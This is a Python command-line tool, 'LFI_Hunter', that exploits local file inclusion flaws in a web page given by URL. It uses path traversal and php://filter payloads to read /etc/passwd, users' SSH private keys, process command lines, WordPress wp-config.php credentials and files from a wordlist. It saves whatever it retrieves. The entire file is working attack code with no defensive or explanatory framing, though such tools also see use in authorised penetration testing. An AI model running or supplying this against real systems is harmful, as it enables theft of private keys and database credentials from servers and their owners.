from multiprocessing import Pool
import requests
import argparse
import base64
import signal
import re

class LFI_Hunter():
    def __init__(self,url,file,pid,output_file,threads):
        self.url = url
        self.file = file
        self.pid = pid
        self.output_file = output_file
        self.check = self.size_check()
        self.threads = threads
        if args.os == "unix":
            self.payload = self.url + "../../../../../../../../"
            self.set_processes_wordlist()
            self.set_processes_procs()
            self.get_keys()
            if args.wp:
                self.wp_config()
        if args.os == "win":
            self.payload = self.url + "..\..\..\..\..\..\..\..\\"
            self.set_processes_wordlist()
            if args.wp:
                self.wp_config()
            
    def size_check(self):
        requests.packages.urllib3.disable_warnings()
        if args.o:
            file_write = open(self.output_file,"w")
            file_write.close()

        check = self.url + "../../../../../../../../9fX1SxbT61qUDQKjpDWo8ApV3YTVLpz5ThM3wJ6XOqlaz"
        req_lfi = requests.get(check,verify=False)
        page_size = len(req_lfi.text)

        return page_size

    def write_output(self,line1,line2,line3):
        print(line1)
        print(line2)
        print(line3)
        out_file = open(self.output_file,'a')
        out_file.write(line1)
        out_file.write("\n")
        out_file.write(line2)
        out_file.write(line3)
        out_file.write("\n")
        out_file.close()

    def wp_config(self):
        requests.packages.urllib3.disable_warnings()
        print("\033[31m" + "*" * 100 + "\x1b[0m") #Red printout and back to normal - line separator
        print("Looking for \x1b[6;30;42mLwp-config.php\x1b[0m file\n")
        if args.os == "unix":
            search_dir = "/"
        if args.os == "win":
            search_dir = "\\"

        for traversal_size in range(0,8):
            payload = self.url + "php://filter/convert.base64-encode/resource=" + search_dir + "wp-config.php"
            req_wp = requests.get(payload,verify=False)

            if len(req_wp.text) > self.check:
                found = 1
                try:
                    base64_bytes = req_wp.text.encode('ascii')
                    message_bytes = base64.b64decode(base64_bytes)
                    
                    line1 = "Found: \x1b[6;30;42mwp-config.php file\x1b[0m" #Green file print out and back to normal
                    line2 = "\n" + message_bytes.decode('ascii') + "\n"
                    line3 = "\033[31m" + "*" * 100 + "\x1b[0m" #Red printout and back to normal - line separator
                    
                    if args.o:
                        self.write_output(line1,line2,line3)
                    else:
                        print(line1)
                        print(line2)
                        print(line3)
                    break

                except UnicodeDecodeError:
                    line1 = "Unable to Base64 decode wp-config.php file :("
                    line2 = "\n" + req_wp.text + "\n"
                    line3 = "\033[31m" + "*" * 100 + "\x1b[0m" #Red printout and back to normal - line separator

                    if args.o:
                        self.write_output(line1,line2,line3)
                    else:
                        print(line1)
                        print(line2)
                        print(line3)
                    break
            
            else:
                if args.os == "unix":
                    search_dir = "../" + search_dir
                if args.os == "win":
                    search_dir = "..\\" + search_dir
            
        if found != 1:
            print("Unable to find wp-config.php")
            print("\033[31m" + "*" * 100 + "\x1b[0m") #Red printout and back to normal - line separator

    def get_keys(self):
        requests.packages.urllib3.disable_warnings()
        find_users = self.payload + "/etc/passwd"
        req_lfi = requests.get(find_users,verify=False)
        search = re.findall("/home/(.*):/bin/",req_lfi.text)
        
        for each_user in search:
            print("Searching for SSH keys for user(s) " + each_user)
            ssh_payload = self.url + "../../../../../../../../home/" + each_user + "/.ssh/id_rsa"
            req_ssh = requests.get(ssh_payload,verify=False)
            
            if len(req_ssh.text) > self.check:
                line1 = "Found: \x1b[6;30;42mSSH Keys for " + each_user.strip() + "\x1b[0m" #Green file print out and back to normal
                line2 = "\n" + req_ssh.text + "\n"
                line3 = "\033[31m" + "*" * 100 + "\x1b[0m" #Red printout and back to normal - line separator
                
                if args.o:
                    self.write_output(line1,line2,line3)
                else:
                    print(line1)
                    print(line2)
                    print(line3)

            else:
                print("No SSH keys found for user(s) " + each_user.strip())
                print("\033[31m" + "*" * 100 + "\x1b[0m") #Red printout and back to normal - line separator

    def set_processes_wordlist(self): 
        original_sigint_handler = signal.signal(signal.SIGINT, signal.SIG_IGN)
        pool = Pool(processes=int(self.threads)) 
        signal.signal(signal.SIGINT, original_sigint_handler)

        wordlist = []
        with open(self.file,'r') as wordlist_file: 
            for each_word in wordlist_file: 
                wordlist.append(each_word.rstrip())

        try:
            start = pool.map_async(self.lfihunt,wordlist)
        except KeyboardInterrupt:
            pool.terminate()
        else:
            pool.close()
        pool.join()

    def set_processes_procs(self):
        print("Searching for running processes in /proc/$(PID)/cmdline")

        original_sigint_handler = signal.signal(signal.SIGINT, signal.SIG_IGN)
        pool = Pool(processes=int(self.threads)) 
        signal.signal(signal.SIGINT, original_sigint_handler)

        wordlist = []
        for each_pid in range(0,int(self.pid)):  
            wordlist.append(each_pid)

        try:
            start = pool.map_async(self.get_procs,wordlist)
        except KeyboardInterrupt:
            pool.terminate()
        else:
            pool.close()
        pool.join()

    def get_procs(self,each_pid):
        requests.packages.urllib3.disable_warnings()
        headers = {
            "Connection":"close"
        }

        process = self.payload + "/proc/" + str(each_pid) + "/cmdline"
        req_proc = requests.get(process,headers=headers,verify=False)
        if len(req_proc.text) > self.check:
            line1 = "Process: \x1b[6;30;42m/proc/" + str(each_pid) + "/cmdline\x1b[0m" #Green file print out and back to normal
            line2 = "\n" + req_proc.text + "\n"
            line3 = "\033[31m" + "*" * 100 + "\x1b[0m" #Red printout and back to normal - line separator
            if args.o:
                self.write_output(line1,line2,line3)
            else:
                print(line1)
                print(line2)
                print(line3)

    def lfihunt(self,each_line):
        requests.packages.urllib3.disable_warnings()
        headers = {
            "Connection":"close" 
        }

        req_lfi = requests.get(self.payload + each_line,headers=headers,verify=False)

        if len(req_lfi.text) > self.check:
            line1 = "File: \x1b[6;30;42m" + each_line + "\x1b[0m" #Green file print out and back to normal
            line2 = "\n" + req_lfi.text + "\n"
            line3 = "\033[31m" + "*" * 100 + "\x1b[0m" #Red printout and back to normal - line separator
            if args.o:
                self.write_output(line1,line2,line3)
            else:
                print(line1)
                print(line2)
                print(line3)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='LFI Enumeration Tool')
    parser.add_argument('-u', metavar='<url URL>', help='Example: -u http://lfi.location/example.php?parameter=', required=True)
    parser.add_argument('-w', metavar='<Wordlist file>',help="Example: -w unix.txt", required=True)
    parser.add_argument('-os', metavar='<Operating System choice>',help="Example: -os unix or -os win", required=True)
    parser.add_argument('-p', metavar='<Set max pid value>',default='1000',help="Default is 1000. Example: -p 2000", required=False)
    parser.add_argument('-wp',action='store_true',help="If site is running Wordpress, looks for wp-config.php.", required=False)
    parser.add_argument('-o', metavar='<Output file>',help="Example: -o output.txt", required=False)
    parser.add_argument('-t', metavar='<Threads>',default="10",help="Example: -t 100. Default 10", required=False)
    args = parser.parse_args()
    
    try:
        LFI_Hunter(args.u,args.w,args.p,args.o,args.t)
    except KeyboardInterrupt:
        print("\nBye Bye!")
        exit()